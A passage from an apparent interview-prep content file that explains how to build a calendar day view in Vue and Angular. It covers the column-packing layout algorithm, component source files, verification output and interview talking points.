export const overlaps = (a, b) => a.start < b.end && b.start < a.end;

export function layoutDay(events) {
  const sorted = [...events].sort(
    (a, b) =>
      a.start - b.start || b.end - a.end || (a.id < b.id ? -1 : 1),
  );
  const placed = [];
  let columns = [],
    members = [],
    clusterEnd = -1;
  const close = () => {
    for (const p of members) {
      let span = 1;
      while (
        p.col + span < columns.length &&
        !columns[p.col + span].some((o) => overlaps(o, p.ev))
      )
        span++;
      placed.push({ ...p.ev, col: p.col, cols: columns.length, span });
    }
    columns = [];
    members = [];
    clusterEnd = -1;
  };
  for (const ev of sorted) {
    if (ev.start >= clusterEnd) close();
    let col = columns.findIndex((c) => c[c.length - 1].end <= ev.start);
    if (col === -1) {
      col = columns.length;
      columns.push([]);
    }
    columns[col].push(ev);
    members.push({ ev, col });
    clusterEnd = Math.max(clusterEnd, ev.end);
  }
  close();
  return placed;
}
\`\`\`

📌 **Interview term: Cluster** — events linked by a chain of overlaps. The sweep keeps the running maximum end; an event that starts at or after it cannot overlap anything open, so the cluster closes and the next one starts with zero columns.

📌 **Interview term: Greedy interval colouring** — in start order, each event goes into the first column whose last event has ended. That uses the fewest columns possible. Every event in the cluster is then drawn with the cluster's column count, and widens right while the next column holds nothing that overlaps it.

On the sample day, Interview (11:00 to 12:00) sits in column 1; column 2 only holds Design review, which ends at 11:00, so Interview spans two of three columns. Lunch (12:00) starts exactly when the cluster ends and is full width.

### 3.2 Derived layout, inline styles

\`\`\`js
const placed = computed(() => layoutDay(events.value));
const boxStyle = (ev) => ({
  top: (ev.start - DAY_START) * PX_PER_MIN + "px",
  height: Math.max((ev.end - ev.start) * PX_PER_MIN, 20) + "px",
  left: pct(ev.col / ev.cols),
  width: pct(ev.span / ev.cols),
});
\`\`\`

📌 **Interview term: computed** — a cached derived value; \`placed\` re-runs only when \`events\` changes, never when a different event is merely selected ([computed vs watch](/interview-question/what-is-the-difference-between-computed-and-watch)).

\`push\` into \`events.value\` is tracked because \`ref\` makes arrays deeply reactive, and \`layoutDay\` reads the whole array, so adding an event re-lays out the day. Delete assigns a filtered array.

### 3.3 Template

\`\`\`vue
<div v-for="ev in placed" :key="ev.id" role="listitem">
  <button type="button" :class="['ev', { sel: ev.id === selectedId }]" :data-id="ev.id"
    :data-col="ev.col" :data-cols="ev.cols" :data-span="ev.span" :aria-pressed="ev.id === selectedId"
    :aria-label="\`\${ev.title}, \${fmt(ev.start)} to \${fmt(ev.end)}\`" :style="boxStyle(ev)"
    @click="selectedId = ev.id === selectedId ? null : ev.id">
\`\`\`

Rendering in \`placed\` order (start order) makes Tab visit events chronologically. The key is the event id, so a re-layout moves existing buttons instead of recreating them ([keys in v-for](/interview-question/why-is-the-key-attribute-important-in-v-for)).

### 3.4 The form

\`v-model\` binds title, start and end on a \`reactive\` form object; \`@submit.prevent="add"\` validates (title present, end after start, inside 08:00 to 19:00) and writes errors to a \`role="alert"\` paragraph. \`input type="time"\` with \`step="900"\` suggests 15-minute steps ([v-model on inputs](/interview-question/how-does-v-model-work-on-form-inputs)).

## 4. Verified

The pure function in Node 22, with a naive "width = 1 / (overlapping + 1)" layout for comparison:

\`\`\`text
a Planning      09:00-10:30  col 0/3 span 1
b 1:1 Sam       09:30-10:00  col 1/3 span 1
c Design review 09:45-11:00  col 2/3 span 1
d Standup       10:30-11:30  col 0/3 span 1
e Interview     11:00-12:00  col 1/3 span 2
f Lunch         12:00-13:00  col 0/1 span 1
g Workshop      13:30-14:30  col 0/2 span 1
h Call          13:30-14:00  col 1/2 span 1
i Focus time    14:00-15:00  col 1/2 span 1
packed layout collisions: none
naive layout collisions : bc,cd,de
\`\`\`

The component in jsdom (Vue 3.5.44). jsdom has no layout, so the driver read each box's inline style and checked every pair of time-overlapping boxes for horizontal intersection. React and Angular printed the same lines:

\`\`\`text
layout: a:0/3 b:1/3 c:2/3 d:0/3 e:1/3x2 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
Interview box: top 180px height 60px left 33.3333% width 66.6667% | Interview, 11:00 to 12:00
Tab order: a b c d e f g h i
add Sync 09:15-09:45: a:0/3 n1:1/3 b:2/3 c:1/3 d:0/3 e:1/3x2 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
invalid add -> End time must be after the start time. | events: 10
out of hours -> Events must fit between 08:00 and 19:00.
select Interview -> Interview11:00 to 12:00Delete event | aria-pressed: true
delete Interview: a:0/3 n1:1/3 b:2/3 c:1/3 d:0/3 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
details -> Select an event to see details.
\`\`\`

\`e:1/3x2\` is "column 1 of 3, spans 2". The naive layout collided three times; the packed one never did, including after adding Sync and deleting Interview. Colours and the 360 px rendering were not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Back-to-back events | Strict overlap test: they share a column |
| Same start time | Longer first, then id order |
| Tiny events | Minimum height 20 px |
| Keyboard order | Buttons rendered in start order |
| Screen readers | Full time range in \`aria-label\`, \`aria-pressed\`, live details region, \`aria-hidden\` hour labels |

## 6. Common Pitfalls

- **Width from the count of overlapping events.** Collides on chains (verified: 3 collisions).
- **Closing a cluster when the previous event ends** instead of the running maximum end.
- **Storing \`col\` / \`width\` on the events.** They go stale on every add; derive them with \`computed\`.
- **\`<=\` in \`overlaps\`.** Back-to-back meetings get pushed into extra columns.
- **Pixel widths.** Use percentages so the view adapts to narrow screens.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Model:</strong> <span style="color:#f0e2c8;">"Events in minutes, and a pure <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">layoutDay</code> that returns <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">col</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">cols</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">span</code>, wrapped in a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Clusters:</strong> <span style="color:#f0e2c8;">"Sort by start with longer first, then sweep, closing a cluster when the next start reaches the running maximum end."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Columns:</strong> <span style="color:#f0e2c8;">"First free column for each event, and the whole cluster shares the column count."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Expand:</strong> <span style="color:#f0e2c8;">"Widen right while the neighbouring column has nothing overlapping."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Render:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">top</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">height</code> from minutes, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">left</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">width</code> as percentages, buttons in time order with full labels."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">computed</code> and not a <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">watch</code> that writes positions?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">The layout is a pure function of <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">events</code>; a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code> is cached and cannot drift. A <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">watch</code> writing a second ref adds a sync step and an extra render.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would dragging work?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Keep a draft event in a ref while dragging, compute <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">layoutDay</code> over the list with the draft swapped in, and commit on drop; snap to 15 minutes.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">What is the complexity?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">O(n log n) for the sort plus a sweep over columns per event; negligible for a day.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test the layout?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Plain unit tests for <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">layoutDay</code> with tricky cases, plus a randomized test that no two overlapping events share horizontal space.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Pure layout function** | Data in, positions out |
| **Cluster** | Events linked by a chain of overlaps |
| **Greedy interval colouring** | First free column in start order |
| **computed** | Cached derived value |
| **Span expansion** | Widening into free neighbouring columns |

---
**Conclusion:** In Vue the day view is one \`computed\` over a pure layout function, plus inline styles that turn \`col\`, \`cols\` and \`span\` into percentages. The algorithm (sort, cluster by running maximum end, greedy columns, expand) produced zero collisions on a day designed to break naive layouts, and stayed correct as events were added and deleted.`,
        files: {
          "/src/App.vue": `<script setup>
import DayView from "./components/DayView.vue";
</script>

<template>
  <main class="page">
    <DayView />
  </main>
</template>

<style>
body {
  margin: 0;
  background: #0f1115;
  color: #e6e6e6;
  font-family: system-ui, sans-serif;
}
.page {
  max-width: 860px;
  margin: 0 auto;
  padding: 20px 16px;
}
.dv h2 {
  font-size: 17px;
  margin: 0 0 12px;
}
.dv-body {
  display: flex;
  flex-wrap: wrap;
  gap: 16px;
}
.dv-grid {
  position: relative;
  flex: 1 1 320px;
  min-width: 0;
  margin-top: 8px;
}
.dv-hour {
  position: absolute;
  left: 0;
  right: 0;
  border-top: 1px solid #262c36;
}
.dv-hour span {
  position: absolute;
  top: -8px;
  left: 0;
  font-size: 11px;
  color: #7d8590;
  background: #0f1115;
  padding-right: 4px;
}
.dv-events {
  position: absolute;
  top: 0;
  bottom: 0;
  left: 48px;
  right: 4px;
}
.ev {
  position: absolute;
  box-sizing: border-box;
  border: 1px solid #0f1115;
  border-left: 3px solid #f9a825;
  border-radius: 6px;
  background: #2a2214;
  color: #f0e2c8;
  text-align: left;
  padding: 2px 6px;
  font:
    12px/1.3 system-ui,
    sans-serif;
  overflow: hidden;
  cursor: pointer;
}
.ev span {
  color: #c9b48a;
}
.ev.sel {
  background: #f9a825;
  color: #1c140a;
}
.ev.sel span {
  color: #3d2810;
}
.ev:focus-visible {
  outline: 2px solid #fff;
  outline-offset: 1px;
  z-index: 2;
}
.dv-side {
  flex: 1 1 220px;
  display: flex;
  flex-direction: column;
  gap: 16px;
}
.dv-side section,
.dv-side form {
  background: #171a21;
  border: 1px solid #2c3340;
  border-radius: 10px;
  padding: 12px;
}
.dv-side h3 {
  margin: 0 0 4px;
  font-size: 15px;
}
.dv-side p {
  margin: 4px 0;
}
.muted {
  color: #8b949e;
  font-size: 14px;
}
form {
  display: flex;
  flex-direction: column;
  gap: 8px;
}
label {
  display: flex;
  flex-direction: column;
  font-size: 12px;
  color: #9aa4b2;
  gap: 4px;
}
input {
  background: #0f1115;
  color: #e6e6e6;
  border: 1px solid #2c3340;
  border-radius: 6px;
  padding: 6px 8px;
  font: inherit;
  color-scheme: dark;
}
button {
  font: inherit;
}
.dv-side button {
  background: #222834;
  color: #e6e6e6;
  border: 1px solid #2c3340;
  border-radius: 8px;
  padding: 6px 12px;
  cursor: pointer;
}
.err {
  color: #ff8a80;
  font-size: 13px;
}
</style>
`,
          "/src/components/DayView.vue": `<script setup>
import { computed, reactive, ref } from "vue";
import {
  DAY_END,
  DAY_START,
  SAMPLE,
  fmt,
  layoutDay,
  pct,
  toMin,
} from "../layout.js";

const PX_PER_MIN = 1; // 60px per hour
const HOURS = Array.from(
  { length: (DAY_END - DAY_START) / 60 + 1 },
  (_, i) => DAY_START + i * 60,
);

const events = ref(SAMPLE.map((e) => ({ ...e })));
const selectedId = ref(null);
const form = reactive({ title: "", start: "09:15", end: "09:45" });
const error = ref("");
let nextId = 1;

// Derived, never stored: re-runs only when events changes.
const placed = computed(() => layoutDay(events.value));
const selected = computed(() =>
  events.value.find((e) => e.id === selectedId.value),
);

const boxStyle = (ev) => ({
  top: (ev.start - DAY_START) * PX_PER_MIN + "px",
  height: Math.max((ev.end - ev.start) * PX_PER_MIN, 20) + "px",
  left: pct(ev.col / ev.cols),
  width: pct(ev.span / ev.cols),
});

function add() {
  const start = toMin(form.start),
    end = toMin(form.end);
  if (!form.title.trim()) return (error.value = "Give the event a title.");
  if (end <= start)
    return (error.value = "End time must be after the start time.");
  if (start < DAY_START || end > DAY_END)
    return (error.value = \`Events must fit between \${fmt(DAY_START)} and \${fmt(DAY_END)}.\`);
  events.value.push({
    id: "n" + nextId++,
    title: form.title.trim(),
    start,
    end,
  });
  form.title = "";
  error.value = "";
}
function remove(id) {
  events.value = events.value.filter((e) => e.id !== id);
  selectedId.value = null;
}
</script>

<template>
  <div class="dv">
    <h2>Thursday, March 12, 2026</h2>
    <div class="dv-body">
      <div
        class="dv-grid"
        :style="{ height: (DAY_END - DAY_START) * PX_PER_MIN + 'px' }"
      >
        <div
          v-for="h in HOURS"
          :key="h"
          class="dv-hour"
          :style="{ top: (h - DAY_START) * PX_PER_MIN + 'px' }"
          aria-hidden="true"
        >
          <span>{{ fmt(h) }}</span>
        </div>
        <div class="dv-events" role="list" aria-label="Events, in time order">
          <div v-for="ev in placed" :key="ev.id" role="listitem">
            <button type="button" :class="['ev', { sel: ev.id === selectedId }]" :data-id="ev.id"
              :data-col="ev.col" :data-cols="ev.cols" :data-span="ev.span" :aria-pressed="ev.id === selectedId"
              :aria-label="\`\${ev.title}, \${fmt(ev.start)} to \${fmt(ev.end)}\`" :style="boxStyle(ev)"
              @click="selectedId = ev.id === selectedId ? null : ev.id">
              <strong>{{ ev.title }}</strong> <span>{{ fmt(ev.start) }}-{{ fmt(ev.end) }}</span>
            </button>
          </div>
        </div>
      </div>
      <aside class="dv-side">
        <section aria-live="polite" data-testid="details">
          <template v-if="selected">
            <h3>{{ selected.title }}</h3>
            <p>{{ fmt(selected.start) }} to {{ fmt(selected.end) }}</p>
            <button
              type="button"
              @click="remove(selected.id)"
            >Delete event</button>
          </template>
          <p v-else class="muted">Select an event to see details.</p>
        </section>
        <form aria-label="Add event" @submit.prevent="add">
          <label>Title <input v-model="form.title" /></label>
          <label>Start <input type="time" step="900" v-model="form.start" /></label>
          <label>End <input type="time" step="900" v-model="form.end" /></label>
          <button type="submit">Add event</button>
          <p v-if="error" role="alert" class="err">{{ error }}</p>
        </form>
      </aside>
    </div>
  </div>
</template>
`,
          "/src/layout.js": `// Column packing for one day of events. Times are minutes since midnight.
// 1. Sort by start (longer first on ties).
// 2. Sweep: a cluster is a run of events connected by overlaps. When the next
//    event starts at or after the cluster's latest end, the cluster is closed.
// 3. Inside a cluster, put each event in the first column whose last event has
//    ended (greedy interval colouring), else open a new column.
// 4. Every event in a cluster shares the cluster's column count, then expands
//    right across neighbouring columns that have nothing overlapping it.
// touching is not overlapping
export const overlaps = (a, b) => a.start < b.end && b.start < a.end;

export function layoutDay(events) {
  const sorted = [...events].sort(
    (a, b) => a.start - b.start || b.end - a.end || (a.id < b.id ? -1 : 1),
  );
  const placed = [];
  let columns = [],
    members = [],
    clusterEnd = -1;

  const close = () => {
    for (const p of members) {
      let span = 1;
      while (
        p.col + span < columns.length &&
        !columns[p.col + span].some((o) => overlaps(o, p.ev))
      )
        span++;
      placed.push({ ...p.ev, col: p.col, cols: columns.length, span });
    }
    columns = [];
    members = [];
    clusterEnd = -1;
  };

  for (const ev of sorted) {
    if (ev.start >= clusterEnd) close();
    let col = columns.findIndex((c) => c[c.length - 1].end <= ev.start);
    if (col === -1) {
      col = columns.length;
      columns.push([]);
    }
    columns[col].push(ev);
    members.push({ ev, col });
    clusterEnd = Math.max(clusterEnd, ev.end);
  }
  close();
  // same order as sorted: by start time, which is also the Tab order
  return placed;
}

export const DAY_START = 8 * 60; // 08:00
export const DAY_END = 19 * 60; // 19:00
export const toMin = (hhmm) => {
  const [h, m] = hhmm.split(":").map(Number);
  return h * 60 + m;
};
export const fmt = (min) =>
  String(Math.floor(min / 60)).padStart(2, "0") +
  ":" +
  String(min % 60).padStart(2, "0");
export const pct = (n) => +(n * 100).toFixed(4) + "%";

// A deliberately tricky day: chains, a touching
// boundary, an equal start and a span-2 expansion.
export const SAMPLE = [
  { id: "a", title: "Planning", start: toMin("09:00"), end: toMin("10:30") },
  { id: "b", title: "1:1 Sam", start: toMin("09:30"), end: toMin("10:00") },
  {
    id: "c",
    title: "Design review",
    start: toMin("09:45"),
    end: toMin("11:00"),
  },
  { id: "d", title: "Standup", start: toMin("10:30"), end: toMin("11:30") },
  { id: "e", title: "Interview", start: toMin("11:00"), end: toMin("12:00") },
  { id: "f", title: "Lunch", start: toMin("12:00"), end: toMin("13:00") },
  { id: "g", title: "Workshop", start: toMin("13:30"), end: toMin("14:30") },
  { id: "h", title: "Call", start: toMin("13:30"), end: toMin("14:00") },
  { id: "i", title: "Focus time", start: toMin("14:00"), end: toMin("15:00") },
];
`,
        },
      },
      angular: {
        answer: `**Target Audience:** Angular developers preparing for a machine coding round. Assumes standalone components and basic signals.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: the layout function in Node 22, and this Angular 22.2.3 component booted in jsdom, AOT with strict templates and runtime JIT, driven by a script.

## 1. Why This Even Matters — A Story First

Tape meeting strips on a shared whiteboard one at a time and they end up covering each other. A calendar day view instead looks at the whole day: it groups meetings that collide, gives each group enough lanes, puts each meeting in a lane, and widens a meeting when the lanes beside it are free. Rendering is a few bindings; the layout algorithm is what is being tested.

## 2. Requirements and the Signal Model

A timeline from 08:00 to 19:00, events positioned by time and column, no overlapping boxes, expansion into free columns, select and delete, an add form with validation, events reachable by keyboard in time order.

| Piece | Angular tool | Notes |
| :--- | :--- | :--- |
| \`events\` | \`signal<CalEvent[]>\` | Updated immutably with \`.update()\`. |
| \`placed\` | \`computed(() => layoutDay(this.events()))\` | The full layout. |
| \`selected\` | \`computed\` | Details panel content. |
| \`title\`, \`start\`, \`end\`, \`error\` | \`signal\` | Form fields bound with \`[value]\` and \`(input)\`. |

📌 **Interview term: Pure layout function** — \`layoutDay(events: CalEvent[]): Placed[]\` returns each event plus \`col\`, \`cols\` and \`span\`. It is plain TypeScript, unit-testable without TestBed, and identical to the React and Vue versions.

## 3. Build It Step by Step

### 3.1 Types and the overlap test

\`\`\`ts
export type CalEvent = {
  id: string;
  title: string;
  start: number;
  end: number;
};
export type Placed = CalEvent & {
  col: number;
  cols: number;
  span: number;
};
export const overlaps = (a: CalEvent, b: CalEvent) =>
  a.start < b.end && b.start < a.end;
\`\`\`

Strict \`<\` means back-to-back meetings (one ends 10:30, the next starts 10:30) do not overlap and can share a column.

### 3.2 Sort, cluster, columns, expand

\`\`\`ts
const sorted = [...events].sort(
  (a, b) =>
    a.start - b.start || b.end - a.end || (a.id < b.id ? -1 : 1),
);
for (const ev of sorted) {
  // nothing open overlaps: new cluster
  if (ev.start >= clusterEnd) close();
  let col = columns.findIndex((c) => c[c.length - 1].end <= ev.start);
  if (col === -1) {
    col = columns.length;
    columns.push([]);
  }
  columns[col].push(ev);
  members.push({ ev, col });
  clusterEnd = Math.max(clusterEnd, ev.end);
}
\`\`\`

\`close()\` gives every member the cluster's \`columns.length\` and expands each event right while the next column has nothing overlapping it.

📌 **Interview term: Cluster** — a group of events linked by a chain of overlaps. Tracking the running maximum end finds clusters in one pass.

📌 **Interview term: Greedy interval colouring** — first free column in start order; for intervals this uses the minimum number of columns, equal to the most events happening at one instant.

On the sample day, Planning, 1:1, Design review, Standup and Interview form one three-column cluster; Interview widens over the column Design review frees at 11:00; Lunch starts as the cluster ends and is full width.

### 3.3 Binding positions

\`\`\`html
@for (ev of placed(); track ev.id) {
  <div role="listitem">
    <button type="button" class="ev" [class.sel]="ev.id === selectedId()" [attr.data-id]="ev.id"
      [attr.aria-pressed]="ev.id === selectedId()" [attr.aria-label]="ev.title + ', ' + fmt(ev.start) + ' to ' + fmt(ev.end)"
      [style.top.px]="(ev.start - dayStart) * pxPerMin" [style.height.px]="height(ev)"
      [style.left]="pct(ev.col / ev.cols)" [style.width]="pct(ev.span / ev.cols)"
      (click)="selectedId.set(ev.id === selectedId() ? null : ev.id)">
\`\`\`

📌 **Interview term: Style binding with units** — \`[style.top.px]="n"\` appends \`px\` for you; \`[style.left]\` takes a full string such as \`"33.3333%"\`. Percentages keep the layout correct at any container width.

\`track ev.id\` matters here: when an event is added, every other event may change column, and tracking by id moves the existing buttons instead of recreating them, which also preserves keyboard focus on the button the user is on ([why @for requires track](/interview-question/why-does-for-require-track-and-how-does-empty-improve-ux)).

### 3.4 Details with \`@if ... as\`

\`\`\`html
@if (selected(); as s) {
  <h3>{{ s.title }}</h3>
  <p>{{ fmt(s.start) }} to {{ fmt(s.end) }}</p>
  <button type="button" (click)="remove(s.id)">Delete event</button>
} @else {
  <p class="muted">Select an event to see details.</p>
}
\`\`\`

The \`as s\` alias narrows the type for strict templates, so \`s.title\` compiles without \`!\`.

### 3.5 The form without FormsModule

\`\`\`ts
val = (e: Event) => (e.target as HTMLInputElement).value;
add(e: Event) {
  e.preventDefault();
  const start = toMin(this.start()),
    end = toMin(this.end()),
    title = this.title().trim();
  if (!title) return this.error.set("Give the event a title.");
  if (end <= start)
    return this.error.set("End time must be after the start time.");
  // ...
  this.events.update((list) => [
    ...list,
    { id: "n" + this.nextId++, title, start, end },
  ]);
}
\`\`\`

📌 **Interview term: Immutable signal update** — \`.update(fn)\` returns a new array, so \`computed(() => layoutDay(this.events()))\` sees a new reference and recomputes. Pushing into the existing array would not notify the signal ([computed signals](/interview-question/what-is-the-difference-between-computed-signals-and-standard-method-getter-calls)). The React version of this solution found that its updater ran twice under StrictMode and skipped an id; Angular calls \`update\` once, but keeping side effects out of updaters is good practice everywhere.

## 4. Verified

The pure function in Node 22, against a naive "width = 1 / (overlapping + 1)" layout:

\`\`\`text
a Planning      09:00-10:30  col 0/3 span 1
b 1:1 Sam       09:30-10:00  col 1/3 span 1
c Design review 09:45-11:00  col 2/3 span 1
d Standup       10:30-11:30  col 0/3 span 1
e Interview     11:00-12:00  col 1/3 span 2
f Lunch         12:00-13:00  col 0/1 span 1
g Workshop      13:30-14:30  col 0/2 span 1
h Call          13:30-14:00  col 1/2 span 1
i Focus time    14:00-15:00  col 1/2 span 1
packed layout collisions: none
naive layout collisions : bc,cd,de
\`\`\`

The component in jsdom, AOT and JIT both printing these lines, identical to React and Vue. The driver read inline \`top\`, \`height\`, \`left\` and \`width\` and checked every pair of time-overlapping boxes for horizontal intersection:

\`\`\`text
layout: a:0/3 b:1/3 c:2/3 d:0/3 e:1/3x2 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
Interview box: top 180px height 60px left 33.3333% width 66.6667% | Interview, 11:00 to 12:00
Tab order: a b c d e f g h i
add Sync 09:15-09:45: a:0/3 n1:1/3 b:2/3 c:1/3 d:0/3 e:1/3x2 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
invalid add -> End time must be after the start time. | events: 10
out of hours -> Events must fit between 08:00 and 19:00.
select Interview -> Interview11:00 to 12:00Delete event | aria-pressed: true
delete Interview: a:0/3 n1:1/3 b:2/3 c:1/3 d:0/3 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
details -> Select an event to see details.
\`\`\`

Zero collisions in every state, against three for the naive layout. Visual styling was not checked; geometry was.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Back-to-back events | Share a column (strict overlap) |
| Equal starts | Longer first, then id |
| Short events | Minimum 20 px height |
| Keyboard | Buttons in start order, \`aria-pressed\` |
| Screen reader | Full time range labels, live details region, hidden hour labels |

## 6. Common Pitfalls

- **Mutating the events array in place.** The signal keeps the same reference and \`placed\` never recomputes.
- **\`track $index\` for events.** After a re-layout the wrong button keeps focus; track by id.
- **Per-event column counts.** Neighbours of different widths overlap; share the cluster count.
- **Ending clusters on the previous event's end** rather than the running maximum.
- **Width from the overlap count.** Collides on chains, as verified.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Model:</strong> <span style="color:#f0e2c8;">"Minutes since midnight, a typed pure <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">layoutDay</code>, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">placed</code> as a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code> of the events signal."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Clusters:</strong> <span style="color:#f0e2c8;">"Sort by start with longer first, then sweep, closing the cluster when a start reaches the running maximum end."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Columns:</strong> <span style="color:#f0e2c8;">"First free column per event, and the cluster shares the column count."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Expand:</strong> <span style="color:#f0e2c8;">"Widen right while the neighbouring column has nothing overlapping."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Render:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">[style.top.px]</code> from minutes, percentages for <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">left</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">width</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">track ev.id</code>, and labelled buttons in time order."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Would you use OnPush?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">With signals and zoneless rendering, components already re-render only when signals they read change; OnPush adds little here but is harmless and documents intent.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add drag and resize?</span>
</div>
